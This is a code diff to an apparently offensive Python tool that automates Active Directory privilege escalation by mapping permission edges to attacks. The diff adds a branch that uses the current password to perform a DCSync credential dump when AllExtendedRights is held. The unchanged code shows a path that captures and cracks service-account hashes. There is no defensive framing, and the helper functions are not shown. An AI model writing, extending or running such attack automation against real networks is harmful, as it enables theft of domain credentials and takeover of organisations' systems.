@@ -10,13 +10,11 @@ class StandardModule:
         self.engine = engine
         self.actions = PrivescActions(engine)
 
+    # AddMember / GenericWrite / GenericAll / AllExtendedRights are standard privilege abuse.
     def execute(self, rel, context) -> bool:
         edge_type = rel.type
-        target_dn = rel.end_node.get("distinguishedname")
-        target_name = rel.end_node.get("name") or target_dn
+        target_dn, target_name = self.actions.resolve_target(rel)
 
-        if not target_dn:
-            target_dn = self.actions.resolve_distinguished_name(target_name)
         if not target_dn:
             logging.error(f"STANDARD: could not resolve distinguishedname for {edge_type}.")
             return False
@@ -58,6 +56,14 @@ class StandardModule:
                 return False
 
             return self.actions.persist_hash_and_maybe_crack(hash_value, target_name, spn_value)
+
+        if edge_type == "AllExtendedRights":
+            current_auth = context.get_current_auth()
+            current_password = current_auth.get("value")
+            if not current_password:
+                logging.error("STANDARD: no current password available for AllExtendedRights.")
+                return False
+            return self.actions.dcsync(current_password)
 
         logging.info(f"STANDARD: {edge_type} -> {target_name}; no direct exploit mapped yet.")
         return True
